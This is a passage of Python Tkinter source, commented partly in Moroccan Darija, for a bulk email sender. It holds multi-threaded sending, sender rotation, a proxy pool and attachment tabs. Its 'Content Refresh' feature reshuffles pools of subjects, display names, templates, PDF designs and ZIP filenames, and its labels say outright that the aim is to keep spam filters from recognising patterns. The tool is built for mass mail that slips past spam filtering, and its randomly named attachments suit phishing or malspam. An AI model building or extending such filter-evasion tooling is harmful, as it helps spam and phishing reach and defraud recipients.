                                     bg=C["bg3"], fg=C["text"],
                                     relief="flat", bd=0, cursor="hand2",
                                     font=("Segoe UI", 12, "bold"),
                                     width=10,
                                     command=self._pause_send)
        self.pause_btn.pack(side="left", ipady=10, padx=(0, 8))
        
        # Resume
        self.resume_btn = tk.Button(btn_row, text="▶▶  Resume",
                                      bg=C["bg3"], fg=C["text"],
                                      relief="flat", bd=0, cursor="hand2",
                                      font=("Segoe UI", 12, "bold"),
                                      width=10,
                                      command=self._resume_send)
        self.resume_btn.pack(side="left", ipady=10, padx=(0, 8))
        
        # Stop
        self.stop_btn = tk.Button(btn_row, text="■  Stop",
                                    bg=C["red"], fg="#fff",
                                    relief="flat", bd=0, cursor="hand2",
                                    font=("Segoe UI", 12, "bold"),
                                    width=10,
                                    command=self._stop_send)
        self.stop_btn.pack(side="left", ipady=10)
        
        # ⚡ ANIMATED LOADING (kayban mlli kayKhdem send)
        self.loading_frame = tk.Frame(btn_inner, bg=C["bg1"])
        self.loading_frame.pack(fill="x", pady=(10, 0))
        
        self.loading_label = tk.Label(self.loading_frame, text="",
                                        bg=C["bg1"], fg=C["accent"],
                                        font=("Consolas", 11, "bold"))
        self.loading_label.pack(side="left")
        
        self.loading_dots_label = tk.Label(self.loading_frame, text="",
                                             bg=C["bg1"], fg=C["accent"],
                                             font=("Consolas", 11, "bold"))
        self.loading_dots_label.pack(side="left", padx=(4, 0))
        
        self._loading_active = False
        self._loading_step = 0
        
        # 🧪 INLINE TEST EMAIL — f Sender tab direct (bla popup)
        test_row = tk.Frame(action, bg=C["bg2"])
        test_row.pack(fill="x", pady=(4, 8))
        
        test_inner = tk.Frame(test_row, bg=C["bg2"])
        test_inner.pack(fill="x", padx=10, pady=8)
        
        # Header
        hdr_t = tk.Frame(test_inner, bg=C["bg2"])
        hdr_t.pack(fill="x", pady=(0, 4))
        tk.Label(hdr_t, text="🧪 Quick Test Email",
                 bg=C["bg2"], fg=C["accent2"],
                 font=("Segoe UI", 9, "bold")).pack(side="left")
        tk.Label(hdr_t, text="(uses NAFS logic dyal SEND, mafichi y'pause main send)",
                 bg=C["bg2"], fg=C["text3"],
                 font=("Segoe UI", 7)).pack(side="left", padx=(8, 0))
        
        # Email + count + button row
        controls = tk.Frame(test_inner, bg=C["bg2"])
        controls.pack(fill="x")
        
        tk.Label(controls, text="To:", bg=C["bg2"], fg=C["text2"],
                 font=("Segoe UI", 9)).pack(side="left", padx=(0, 4))
        
        self.test_email_var = tk.StringVar()
        self.test_email_entry = tk.Entry(controls, textvariable=self.test_email_var,
                                          font=("Segoe UI", 9),
                                          bg=C["input"], fg=C["text"],
                                          insertbackground=C["accent"],
                                          relief="flat", bd=0,
                                          highlightthickness=1,
                                          highlightbackground=C["border2"],
                                          highlightcolor=C["accent"])
        self.test_email_entry.pack(side="left", fill="x", expand=True, ipady=4, padx=(0, 8))
        
        tk.Label(controls, text="×", bg=C["bg2"], fg=C["text3"],
                 font=("Segoe UI", 9)).pack(side="left", padx=(0, 2))
        
        self.test_count_var = tk.IntVar(value=1)
        test_count_entry = tk.Entry(controls, textvariable=self.test_count_var,
                                      font=("Segoe UI", 9),
                                      bg=C["input"], fg=C["text"],
                                      insertbackground=C["accent"],
                                      relief="flat", bd=0, width=4,
                                      highlightthickness=1,
                                      highlightbackground=C["border2"])
        test_count_entry.pack(side="left", ipady=4, padx=(0, 8))
        
        ABtn(controls, "🧪 Send Test", C["accent"], self._send_test_inline, w=110, h=28).pack(side="left")
        
        # Status label
        self.test_status_lbl = tk.Label(test_inner, text="",
                                         bg=C["bg2"], fg=C["text3"],
                                         font=("Segoe UI", 8))
        self.test_status_lbl.pack(anchor="w", pady=(4, 0))
        
        # Bind Enter f email entry
        self.test_email_entry.bind("<Return>", lambda e: self._send_test_inline())

        # Threads control
        thr_row = tk.Frame(action, bg=C["bg0"])
        thr_row.pack(fill="x", pady=(0,8))
        self._label(thr_row, "Threads:").pack(side="left", padx=(0,6))
        self.threads_var = tk.IntVar(value=5)
        thr_scale = tk.Scale(thr_row, from_=1, to=50,
                             orient="horizontal", variable=self.threads_var,
                             bg=C["bg0"], fg=C["text2"],
                             troughcolor=C["bg2"], highlightthickness=0,
                             activebackground=C["accent"],
                             length=160, showvalue=True,
                             font=("Segoe UI",8))
        thr_scale.pack(side="left")
        self._label(thr_row, "  (parallel senders)", size=7, color=C["text3"]).pack(side="left")

        sel_row = tk.Frame(action, bg=C["bg0"])
        sel_row.pack(fill="x", pady=(0,8))
        self._label(sel_row, "Send from:").pack(side="left", padx=(0,8))
        self.sender_var = tk.StringVar(value="All (rotate)")
        self.sender_combo = ttk.Combobox(sel_row, textvariable=self.sender_var,
                                          font=("Segoe UI",9), width=28, state="readonly")
        self.sender_combo["values"] = ["All (rotate)"]
        self.sender_combo.pack(side="left")

        # Progress bar
        self.progress = ttk.Progressbar(action, mode="determinate")
        self.progress.pack(fill="x", pady=(0,6))

        # 📺 CONSOLE — kbir w mzyan!
        console_hdr = tk.Frame(action, bg=C["bg0"])
        console_hdr.pack(fill="x", pady=(8, 4))
        tk.Label(console_hdr, text="📺 Console — Live Logs",
                 bg=C["bg0"], fg=C["accent2"],
                 font=("Segoe UI", 10, "bold")).pack(side="left")
        # Clear console button
        tk.Button(console_hdr, text="🗑 Clear",
                  bg=C["bg3"], fg=C["text3"],
                  relief="flat", bd=0, cursor="hand2",
                  font=("Segoe UI", 8),
                  command=self._clear_console).pack(side="right", ipady=2, ipadx=6)
        
        # Console wrap m3a border 7nin
        console_wrap = tk.Frame(action, bg=C["accent"], padx=2, pady=2)
        console_wrap.pack(fill="both", expand=True, pady=(0, 0))
        
        self.console = scrolledtext.ScrolledText(
            console_wrap, font=("Consolas", 10),  # font akbar mn 8 → 10!
            bg=C["bg2"], fg=C["text2"],
            insertbackground=C["accent"],
            relief="flat", bd=0,
            highlightthickness=0,
            state="disabled",
            padx=10, pady=8)
        self.console.pack(fill="both", expand=True)

    # ═══════════════════════════════════════════════════════════
    # 🆕 SEPARATE TABS FOR ATTACHMENTS (cleaner Sender tab)
    # ═══════════════════════════════════════════════════════════
    
    def _build_random_att_tab(self, parent):
        """📎 Random Attachments — separate tab"""
        main = tk.Frame(parent, bg=C["bg0"])
        main.pack(fill="both", expand=True, padx=20, pady=20)
        
        # Header
        hdr = tk.Frame(main, bg=C["bg0"])
        hdr.pack(fill="x", pady=(0, 16))
        tk.Label(hdr, text="📎 Random Attachments",
                 bg=C["bg0"], fg=C["accent"],
                 font=("Segoe UI", 16, "bold")).pack(side="left")
        tk.Label(hdr, text="  ·  Per email = random file mn list",
                 bg=C["bg0"], fg=C["text3"],
                 font=("Segoe UI", 10, "italic")).pack(side="left", pady=(8,0))
        
        # Container card
        card = tk.Frame(main, bg=C["bg1"])
        card.pack(fill="both", expand=True)
        cpad = tk.Frame(card, bg=C["bg1"])
        cpad.pack(fill="both", expand=True, padx=20, pady=20)
        
        # Mode selector
        mode_box = tk.Frame(cpad, bg=C["bg2"])
        mode_box.pack(fill="x", pady=(0, 16))
        mode_inner = tk.Frame(mode_box, bg=C["bg2"])
        mode_inner.pack(fill="x", padx=14, pady=10)
        
        tk.Label(mode_inner, text="Mode:",
                 bg=C["bg2"], fg=C["text"],
                 font=("Segoe UI", 10, "bold")).pack(side="left", padx=(0, 16))
        
        for val, txt in [("random","🎲 Random per lead"),
                         ("same","🔁 Same for all"),
                         ("none","✗ No random")]:
            tk.Radiobutton(mode_inner, text=txt, variable=self.att_mode,
                           value=val, bg=C["bg2"], fg=C["text2"],
                           selectcolor=C["bg3"], activebackground=C["bg2"],
                           font=("Segoe UI", 10),
                           padx=8).pack(side="left", padx=(0, 8))
        
        # Listbox
        tk.Label(cpad, text="📁 Files:",
                 bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 10, "bold")).pack(anchor="w", pady=(0, 6))
        
        list_wrap = tk.Frame(cpad, bg=C["accent"], padx=2, pady=2)
        list_wrap.pack(fill="both", expand=True, pady=(0, 12))
        
        # NEW listbox - replace the old one
        new_listbox = tk.Listbox(list_wrap, font=("Segoe UI", 10),
                                  bg=C["input"], fg=C["text"],
                                  selectbackground=C["accent"],
                                  relief="flat", bd=0,
                                  highlightthickness=0)
        new_listbox.pack(fill="both", expand=True)
        # Replace att_listbox reference
        self.att_listbox = new_listbox
        
        # Re-populate ila kayan files
        for f in self.attachment_files:
            new_listbox.insert("end", os.path.basename(f))
        
        # Buttons
        btn_row = tk.Frame(cpad, bg=C["bg1"])
        btn_row.pack(fill="x")
        
        for txt, cmd, color in [("📂 + Files", self._add_att, C["accent"]),
                                  ("📁 + Folder", self._add_folder, C["accent"]),
                                  ("🗑 Clear", self._clear_att, C["red"])]:
            tk.Button(btn_row, text=txt, bg=color, fg="#000" if color != C["red"] else "#fff",
                      relief="flat", bd=0, cursor="hand2",
                      font=("Segoe UI", 10, "bold"),
                      command=cmd).pack(side="left", ipady=8, ipadx=14, padx=(0, 8))
        
        new_count = tk.Label(cpad, text=f"{len(self.attachment_files)} files",
                              bg=C["bg1"], fg=C["text3"],
                              font=("Segoe UI", 9, "italic"))
        new_count.pack(anchor="w", pady=(8, 0))
        self.att_count_lbl = new_count
    
    def _build_fixed_att_tab(self, parent):
        """📌 Fixed Attachments — kaymchiw m3a KOL email"""
        # Safety init storage qbal Sender tab
        if not hasattr(self, 'fixed_attachment_files'):
            self.fixed_attachment_files = []
        
        main = tk.Frame(parent, bg=C["bg0"])
        main.pack(fill="both", expand=True, padx=20, pady=20)
        
        # Header
        hdr = tk.Frame(main, bg=C["bg0"])
        hdr.pack(fill="x", pady=(0, 16))
        tk.Label(hdr, text="📌 Fixed Attachments",
                 bg=C["bg0"], fg=C["yellow"],
                 font=("Segoe UI", 16, "bold")).pack(side="left")
        tk.Label(hdr, text="  ·  Hadou kaymchiw m3a KOL email",
                 bg=C["bg0"], fg=C["text3"],
                 font=("Segoe UI", 10, "italic")).pack(side="left", pady=(8,0))
        
        # Card
        card = tk.Frame(main, bg=C["bg1"])
        card.pack(fill="both", expand=True)
        cpad = tk.Frame(card, bg=C["bg1"])
        cpad.pack(fill="both", expand=True, padx=20, pady=20)
        
        # Info banner
        info_box = tk.Frame(cpad, bg=C["bg2"])
        info_box.pack(fill="x", pady=(0, 16))
        tk.Label(info_box, text="ℹ️  These files attach to EVERY email sent",
                 bg=C["bg2"], fg=C["accent2"],
                 font=("Segoe UI", 10, "bold"),
                 padx=14, pady=10).pack(anchor="w")
        
        # Listbox
        tk.Label(cpad, text="📁 Fixed files:",
                 bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 10, "bold")).pack(anchor="w", pady=(0, 6))
        
        list_wrap = tk.Frame(cpad, bg=C["yellow"], padx=2, pady=2)
        list_wrap.pack(fill="both", expand=True, pady=(0, 12))
        
        new_listbox = tk.Listbox(list_wrap, font=("Segoe UI", 10),
                                  bg=C["input"], fg=C["text"],
                                  selectbackground=C["yellow"],
                                  relief="flat", bd=0,
                                  highlightthickness=0)
        new_listbox.pack(fill="both", expand=True)
        self.fixed_att_listbox = new_listbox
        
        for f in self.fixed_attachment_files:
            new_listbox.insert("end", os.path.basename(f))
        
        # Buttons
        btn_row = tk.Frame(cpad, bg=C["bg1"])
        btn_row.pack(fill="x")
        
        tk.Button(btn_row, text="📂 + Files", bg=C["yellow"], fg="#000",
                  relief="flat", bd=0, cursor="hand2",
                  font=("Segoe UI", 10, "bold"),
                  command=self._add_fixed_att).pack(side="left", ipady=8, ipadx=14, padx=(0, 8))
        tk.Button(btn_row, text="🗑 Clear", bg=C["red"], fg="#fff",
                  relief="flat", bd=0, cursor="hand2",
                  font=("Segoe UI", 10, "bold"),
                  command=self._clear_fixed_att).pack(side="left", ipady=8, ipadx=14)
        
        new_count = tk.Label(cpad, text=f"{len(self.fixed_attachment_files)} fixed files",
                              bg=C["bg1"], fg=C["text3"],
                              font=("Segoe UI", 9, "italic"))
        new_count.pack(anchor="w", pady=(8, 0))
        self.fixed_att_count_lbl = new_count
    
    def _build_settings_tab(self, parent):
        """⚙ Settings — dependencies + system info"""
        # 🆕 SCROLLABLE container bach kolchi yban
        outer = tk.Frame(parent, bg=C["bg0"])
        outer.pack(fill="both", expand=True)
        
        canvas = tk.Canvas(outer, bg=C["bg0"], highlightthickness=0)
        scrollbar = tk.Scrollbar(outer, orient="vertical", command=canvas.yview)
        canvas.configure(yscrollcommand=scrollbar.set)
        
        scrollbar.pack(side="right", fill="y")
        canvas.pack(side="left", fill="both", expand=True)
        
        # Inner frame f canvas
        main = tk.Frame(canvas, bg=C["bg0"])
        canvas_window = canvas.create_window((0, 0), window=main, anchor="nw")
        
        # Auto-resize main width to canvas width
        def _on_canvas_configure(event):
            canvas.itemconfig(canvas_window, width=event.width)
        canvas.bind("<Configure>", _on_canvas_configure)
        
        # Update scroll region when content changes
        def _on_main_configure(event):
            canvas.configure(scrollregion=canvas.bbox("all"))
        main.bind("<Configure>", _on_main_configure)
        
        # Mouse wheel scrolling
        def _on_mousewheel(event):
            try:
                canvas.yview_scroll(int(-1 * (event.delta / 120)), "units")
            except: pass
        canvas.bind_all("<MouseWheel>", _on_mousewheel)
        
        # Padding inside main
        main_pad = tk.Frame(main, bg=C["bg0"])
        main_pad.pack(fill="both", expand=True, padx=20, pady=20)
        main = main_pad
        
        # Header
        hdr = tk.Frame(main, bg=C["bg0"])
        hdr.pack(fill="x", pady=(0, 16))
        tk.Label(hdr, text="⚙ Settings",
                 bg=C["bg0"], fg=C["accent"],
                 font=("Segoe UI", 16, "bold")).pack(side="left")
        tk.Label(hdr, text="  ·  System info + dependencies management",
                 bg=C["bg0"], fg=C["text3"],
                 font=("Segoe UI", 10, "italic")).pack(side="left", pady=(8, 0))
        
        # Container
        body = tk.Frame(main, bg=C["bg0"])
        body.pack(fill="both", expand=True)
        
        # ═══ DEPENDENCIES STATUS ═══
        deps_card = tk.Frame(body, bg=C["bg1"])
        deps_card.pack(fill="x", pady=(0, 14))
        deps_inner = tk.Frame(deps_card, bg=C["bg1"])
        deps_inner.pack(fill="x", padx=18, pady=16)
        
        tk.Label(deps_inner, text="📦 Dependencies Status",
                 bg=C["bg1"], fg=C["accent"],
                 font=("Segoe UI", 12, "bold")).pack(anchor="w", pady=(0, 8))
        
        tk.Label(deps_inner,
                 text="Hadi packages lazem ykounou installed bach app yKhdem 100%:",
                 bg=C["bg1"], fg=C["text3"],
                 font=("Segoe UI", 9)).pack(anchor="w", pady=(0, 10))
        
        # Status table
        self._deps_status_frame = tk.Frame(deps_inner, bg=C["bg2"])
        self._deps_status_frame.pack(fill="x", pady=(0, 10))
        
        # Headers
        hdr_row = tk.Frame(self._deps_status_frame, bg=C["bg3"])
        hdr_row.pack(fill="x")
        tk.Label(hdr_row, text="  Package", bg=C["bg3"], fg=C["text"],
                 font=("Segoe UI", 9, "bold"), anchor="w",
                 width=30).pack(side="left", ipady=6)
        tk.Label(hdr_row, text="Status", bg=C["bg3"], fg=C["text"],
                 font=("Segoe UI", 9, "bold"), anchor="w",
                 width=15).pack(side="left", ipady=6)
        tk.Label(hdr_row, text="Purpose", bg=C["bg3"], fg=C["text"],
                 font=("Segoe UI", 9, "bold"), anchor="w").pack(side="left", ipady=6)
        
        # Package rows
        self._deps_rows = {}
        package_purposes = {
            'reportlab': 'PDF generation',
            'google-api-python-client': 'Gmail API access',
            'google-auth': 'OAuth2 authentication',
            'google-auth-httplib2': 'HTTP transport',
            'google-auth-oauthlib': 'OAuth2 flow',
            'requests': 'HTTP requests',
            'pysocks': 'SOCKS proxy support',
        }
        
        for i, (pip_name, import_name) in enumerate(REQUIRED_PACKAGES.items()):
            row_bg = C["bg2"] if i % 2 == 0 else C["bg1"]
            row = tk.Frame(self._deps_status_frame, bg=row_bg)
            row.pack(fill="x")
            
            tk.Label(row, text=f"  {pip_name}", bg=row_bg, fg=C["text2"],
                     font=("Segoe UI", 9), anchor="w",
                     width=30).pack(side="left", ipady=4)
            
            status_lbl = tk.Label(row, text="...", bg=row_bg, fg=C["yellow"],
                                   font=("Segoe UI", 9, "bold"), anchor="w",
                                   width=15)
            status_lbl.pack(side="left", ipady=4)
            
            tk.Label(row, text=package_purposes.get(pip_name, ""),
                     bg=row_bg, fg=C["text3"],
                     font=("Segoe UI", 9, "italic"), anchor="w").pack(side="left", ipady=4)
            
            self._deps_rows[pip_name] = (status_lbl, import_name)
        
        # Action buttons
        btn_row = tk.Frame(deps_inner, bg=C["bg1"])
        btn_row.pack(fill="x", pady=(8, 0))
        
        tk.Button(btn_row, text="🔄 Refresh Status",
                  bg=C["bg3"], fg=C["accent2"],
                  relief="flat", bd=0, cursor="hand2",
                  font=("Segoe UI", 10, "bold"),
                  command=self._refresh_deps_status).pack(side="left",
                                                           ipady=8, ipadx=14, padx=(0, 8))
        
        tk.Button(btn_row, text="📦 Install Missing",
                  bg=C["green"], fg="#000",
                  relief="flat", bd=0, cursor="hand2",
                  font=("Segoe UI", 10, "bold"),
                  command=self._install_missing_deps).pack(side="left",
                                                            ipady=8, ipadx=14, padx=(0, 8))
        
        tk.Button(btn_row, text="🔁 Re-install ALL",
                  bg=C["accent"], fg="#fff",
                  relief="flat", bd=0, cursor="hand2",
                  font=("Segoe UI", 10, "bold"),
                  command=self._reinstall_all_deps).pack(side="left",
                                                          ipady=8, ipadx=14)
        
        # Status message — MUST be created BEFORE _refresh_deps_status
        self._deps_msg_lbl = tk.Label(deps_inner, text="",
                                        bg=C["bg1"], fg=C["text3"],
                                        font=("Segoe UI", 9, "italic"),
                                        wraplength=900, justify="left")
        self._deps_msg_lbl.pack(anchor="w", pady=(10, 0))
        
        # 🎯 Refresh status NOW (after label exists)
        self._refresh_deps_status()
        
        # ═══ 🔄 CONTENT REFRESH (rotation seed) ═══
        refresh_card = tk.Frame(body, bg=C["bg1"])
        refresh_card.pack(fill="x", pady=(0, 14))
        refresh_inner = tk.Frame(refresh_card, bg=C["bg1"])
        refresh_inner.pack(fill="x", padx=18, pady=16)
        
        tk.Label(refresh_inner, text="🔄 Content Refresh",
                 bg=C["bg1"], fg=C["green"],
                 font=("Segoe UI", 12, "bold")).pack(anchor="w", pady=(0, 8))
        
        tk.Label(refresh_inner,
                 text="Refresh kolchi mn random pools (subjects, names, templates, PDFs, ZIPs).\n"
                      "Manhaj/style kayb9a same — walakin CONTENT yt'jaddad kolla → spam filters mafichi y'recognize patterns!",
                 bg=C["bg1"], fg=C["text3"],
                 font=("Segoe UI", 9),
                 justify="left").pack(anchor="w", pady=(0, 12))
        
        # 🎯 BIG REFRESH BUTTON (top — most visible!)
        big_btn_card = tk.Frame(refresh_inner, bg=C["green"])
        big_btn_card.pack(fill="x", pady=(0, 14))
        
        big_btn = tk.Button(big_btn_card, text="🔄  REFRESH ALL CONTENT NOW",
                  bg=C["green"], fg="#000",
                  relief="flat", bd=0, cursor="hand2",
                  font=("Segoe UI", 14, "bold"),
                  command=self._do_content_refresh)
        big_btn.pack(fill="x", ipady=14, padx=2, pady=2)
        
        # Status message direct under button
        self._refresh_msg_lbl = tk.Label(refresh_inner, text="",
                                           bg=C["bg1"], fg=C["text3"],
                                           font=("Segoe UI", 10, "bold italic"))
        self._refresh_msg_lbl.pack(anchor="w", pady=(0, 12))
        
        # Status display
        status_box = tk.Frame(refresh_inner, bg=C["bg2"])
        status_box.pack(fill="x", pady=(0, 12))
        status_inner = tk.Frame(status_box, bg=C["bg2"])
        status_inner.pack(fill="x", padx=14, pady=10)
        
        tk.Label(status_inner, text="Current rotation status:",
                 bg=C["bg2"], fg=C["text2"],
                 font=("Segoe UI", 9, "bold")).pack(anchor="w", pady=(0, 6))
        
        # Show current seed + last refresh
        current_seed = ROTATION_SEED if ROTATION_SEED != 0 else "Default (no rotation yet)"
        last_refresh_display = LAST_REFRESH if LAST_REFRESH else "Never refreshed"
        
        seed_row = tk.Frame(status_inner, bg=C["bg2"])
        seed_row.pack(fill="x")
        tk.Label(seed_row, text="🎲  Rotation seed:",
                 bg=C["bg2"], fg=C["text3"],
                 font=("Segoe UI", 9), anchor="w",
                 width=20).pack(side="left")
        self._seed_value_lbl = tk.Label(seed_row, text=str(current_seed),
                                          bg=C["bg2"], fg=C["accent2"],
                                          font=("Consolas", 9, "bold"), anchor="w")
        self._seed_value_lbl.pack(side="left")
        
        last_row = tk.Frame(status_inner, bg=C["bg2"])
        last_row.pack(fill="x", pady=(4, 0))
        tk.Label(last_row, text="📅  Last refresh:",
                 bg=C["bg2"], fg=C["text3"],
                 font=("Segoe UI", 9), anchor="w",
                 width=20).pack(side="left")
        self._last_refresh_lbl = tk.Label(last_row, text=last_refresh_display,
                                            bg=C["bg2"], fg=C["text2"],
                                            font=("Consolas", 9), anchor="w")
        self._last_refresh_lbl.pack(side="left")
        
        # Refresh affects
        affects_box = tk.Frame(refresh_inner, bg=C["bg1"])
        affects_box.pack(fill="x", pady=(0, 4))
        
        tk.Label(affects_box, text="Refresh affects:",
                 bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 9, "bold")).pack(anchor="w", pady=(0, 4))
        
        affects_list = [
            "✓ Subject pool order (50K+ unique combinations)",
            "✓ Display names pool (21K+ unique)",
            "✓ HTML templates layouts/colors",
            "✓ PDF designs & color schemes",
            "✓ Smart ZIP filenames",
            "✓ From email aliases rotation",
        ]
        for txt in affects_list:
            tk.Label(affects_box, text=f"   {txt}",
                     bg=C["bg1"], fg=C["text3"],
                     font=("Segoe UI", 9)).pack(anchor="w")
        
        # ═══ SYSTEM INFO ═══
        sys_card = tk.Frame(body, bg=C["bg1"])
        sys_card.pack(fill="x", pady=(0, 14))
        sys_inner = tk.Frame(sys_card, bg=C["bg1"])
        sys_inner.pack(fill="x", padx=18, pady=16)
        
        tk.Label(sys_inner, text="💻 System Information",
                 bg=C["bg1"], fg=C["accent"],
                 font=("Segoe UI", 12, "bold")).pack(anchor="w", pady=(0, 8))
        
        # System info rows
        info_box = tk.Frame(sys_inner, bg=C["bg2"])
        info_box.pack(fill="x", pady=(0, 8))
        
        import platform
        info_data = [
            ("Python Version", sys.version.split()[0]),
            ("Platform", platform.system() + " " + platform.release()),
            ("Architecture", platform.machine()),
            ("Python Path", sys.executable),
            ("Working Directory", os.getcwd()),
        ]
        
        for i, (key, val) in enumerate(info_data):
            row_bg = C["bg2"] if i % 2 == 0 else C["bg3"]
            row = tk.Frame(info_box, bg=row_bg)
            row.pack(fill="x")
            tk.Label(row, text=f"  {key}:", bg=row_bg, fg=C["accent2"],
                     font=("Segoe UI", 9, "bold"), anchor="w",
                     width=22).pack(side="left", ipady=5)
            tk.Label(row, text=str(val), bg=row_bg, fg=C["text2"],
                     font=("Consolas", 9), anchor="w").pack(side="left", ipady=5)
        
        # ═══ ABOUT ═══
        about_card = tk.Frame(body, bg=C["bg1"])
        about_card.pack(fill="x")
        about_inner = tk.Frame(about_card, bg=C["bg1"])
        about_inner.pack(fill="x", padx=18, pady=16)
        
        tk.Label(about_inner, text="ℹ️ About",
                 bg=C["bg1"], fg=C["accent"],
                 font=("Segoe UI", 12, "bold")).pack(anchor="w", pady=(0, 8))
        
        tk.Label(about_inner,
                 text="Sender App v37 · Enterprise Email Sender m3a Workspace OAuth2 + Smart ZIP/PDF\n"
                      "Multi-language (EN/FR/ES/UK) · Per-email personalization · Smart proxy pool",
                 bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 9),
                 justify="left").pack(anchor="w")
    
    def _do_content_refresh(self):
        """🔄 Generate new ROTATION_SEED w refresh ga3 pools"""
        # Confirm
        if not messagebox.askyesno("Refresh All Content",
            "Hadi ka't'generate seed jdid w t'refresh:\n\n"
            "  • Subjects pool order\n"
            "  • Display names pool\n"
            "  • HTML templates designs\n"
            "  • PDF color schemes\n"
            "  • ZIP filenames\n\n"
            "Manhaj/style kayb9a same — walakin CONTENT yt'jaddad.\n"
            "Mufid bach spam filters mafichi y'recognize patterns.\n\n"
            "Continue?"):
            return
        
        # Generate seed jdid
        global ROTATION_SEED, LAST_REFRESH
        new_seed = random.randint(1000000, 9999999999)
        new_refresh = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # 🎯 Show "Refreshing..." status f button area
        try:
            self._refresh_msg_lbl.config(
                text="⏳  Refreshing pools, please wait...",
                fg=C["yellow"])
            self.update()
        except: pass
        
        # Save to disk
        if not _save_rotation_seed(new_seed, new_refresh):
            messagebox.showerror("Error", "Failed to save rotation seed!")
            return
        
        # Update globals
        ROTATION_SEED = new_seed
        LAST_REFRESH = new_refresh
        
        # Re-shuffle pools m3a seed jdid
        _apply_rotation_seed_to_pools()
        
        # 🎲 Generate samples bach user yshouf result
        sample_subjects = []
        sample_names = []
        sample_zips = []
        try:
            for _ in range(3):
                sample_subjects.append(self._theme_get_subject())
                sample_names.append(self._theme_get_display_name())
                sample_zips.append(self._theme_get_zip_filename())
        except Exception as e:
            print(f"Sample gen error: {e}")
        
        # Update UI labels
        try:
            self._seed_value_lbl.config(text=str(new_seed))
            self._last_refresh_lbl.config(text=new_refresh)
            self._refresh_msg_lbl.config(
                text=f"✅ Refreshed successfully! Seed: {new_seed}",
                fg=C["green"])
        except: pass
        
        # 🎉 Show BIG success popup m3a samples
        self._show_refresh_success_popup(new_seed, new_refresh,
                                          sample_subjects, sample_names, sample_zips)
        
        # Log to console
        try:
            self._log(f"🔄 Content refreshed — seed: {new_seed}", C["green"])
            self._log(f"   Subjects/Names/Templates/PDFs/ZIPs ga3 jdad!", C["accent2"])
        except: pass
    
    def _show_refresh_success_popup(self, seed, refresh_time,
                                      sample_subjects, sample_names, sample_zips):
        """Show big success popup m3a samples dyal content jdid"""
        win = tk.Toplevel(self)
        win.title("✅ Refresh Successful")
        win.configure(bg=C["bg0"])
        
        w, h = 700, 600
        sw = win.winfo_screenwidth()
        sh = win.winfo_screenheight()
        x = (sw - w) // 2
        y = (sh - h) // 2
        win.geometry(f"{w}x{h}+{x}+{y}")
        win.transient(self)
        win.grab_set()
        
        # Header m3a green theme
        hdr = tk.Frame(win, bg=C["green"])
        hdr.pack(fill="x")
        hdr_inner = tk.Frame(hdr, bg=C["green"])
        hdr_inner.pack(fill="x", padx=24, pady=20)
        
        tk.Label(hdr_inner, text="✅ CONTENT REFRESHED!",
                 bg=C["green"], fg="#000",
                 font=("Segoe UI", 18, "bold")).pack(anchor="w")
        tk.Label(hdr_inner, text="Ga3 random pools jdad — kolchi yt'jaddad daba",
                 bg=C["green"], fg="#000",
                 font=("Segoe UI", 10, "italic")).pack(anchor="w", pady=(2, 0))
        
        # Body
        body = tk.Frame(win, bg=C["bg0"])
        body.pack(fill="both", expand=True, padx=20, pady=16)
        
        # Stats card
        stats_card = tk.Frame(body, bg=C["bg1"])
        stats_card.pack(fill="x", pady=(0, 14))
        stats_inner = tk.Frame(stats_card, bg=C["bg1"])
        stats_inner.pack(fill="x", padx=16, pady=14)
        
        # Seed
        seed_row = tk.Frame(stats_inner, bg=C["bg1"])
        seed_row.pack(fill="x", pady=(0, 4))
        tk.Label(seed_row, text="🎲  New rotation seed:",
                 bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 10, "bold"),
                 width=22, anchor="w").pack(side="left")
        tk.Label(seed_row, text=str(seed),
                 bg=C["bg1"], fg=C["accent"],
                 font=("Consolas", 11, "bold")).pack(side="left")
        
        # Time
        time_row = tk.Frame(stats_inner, bg=C["bg1"])
        time_row.pack(fill="x")
        tk.Label(time_row, text="📅  Refreshed at:",
                 bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 10, "bold"),
                 width=22, anchor="w").pack(side="left")
        tk.Label(time_row, text=refresh_time,
                 bg=C["bg1"], fg=C["accent2"],
                 font=("Consolas", 11)).pack(side="left")
        
        # Samples header
        tk.Label(body, text="🎯  Samples mn content jdid:",
                 bg=C["bg0"], fg=C["accent2"],
                 font=("Segoe UI", 11, "bold")).pack(anchor="w", pady=(0, 8))
        
        # Subjects samples
        if sample_subjects:
            self._add_sample_section(body, "📧  Subjects:",
                                       sample_subjects, C["yellow"])
        
        # Names samples
        if sample_names:
            self._add_sample_section(body, "👤  Display Names:",
                                       sample_names, C["accent"])
        
        # ZIP filenames samples
        if sample_zips:
            self._add_sample_section(body, "📦  ZIP Filenames:",
                                       sample_zips, C["green"])
        
        # Note
        note_card = tk.Frame(body, bg=C["bg2"])
        note_card.pack(fill="x", pady=(8, 0))
        tk.Label(note_card,
                 text="💡  Hadi samples ka'changeou per email aussi — random per email!\n"
                      "    Spam filters mafichi y'recognize patterns daba.",
                 bg=C["bg2"], fg=C["text2"],
                 font=("Segoe UI", 9),
                 justify="left",
                 padx=14, pady=10).pack(anchor="w")
        
        # Close button
        btn_frame = tk.Frame(win, bg=C["bg0"])
        btn_frame.pack(pady=14)
        tk.Button(btn_frame, text="✓  OK, Continue Sending",
                  bg=C["accent"], fg="#fff",
                  relief="flat", bd=0, cursor="hand2",
                  font=("Segoe UI", 11, "bold"),
                  command=win.destroy).pack(ipady=10, ipadx=24)
    
    def _add_sample_section(self, parent, title, items, color):
        """Helper l show samples section"""
        section = tk.Frame(parent, bg=C["bg1"])
        section.pack(fill="x", pady=(0, 8))
        sec_inner = tk.Frame(section, bg=C["bg1"])
        sec_inner.pack(fill="x", padx=14, pady=10)
        
        tk.Label(sec_inner, text=title,
                 bg=C["bg1"], fg=color,
                 font=("Segoe UI", 9, "bold")).pack(anchor="w", pady=(0, 4))
        
        for item in items:
            # Truncate ila too long
            display = item if len(item) < 80 else item[:77] + "..."
            tk.Label(sec_inner, text=f"   •  {display}",
                     bg=C["bg1"], fg=C["text2"],
                     font=("Consolas", 9),
                     anchor="w", justify="left").pack(anchor="w", fill="x")
    
    def _refresh_deps_status(self):
        """Refresh status dyal ga3 packages"""
        if not hasattr(self, '_deps_rows'):
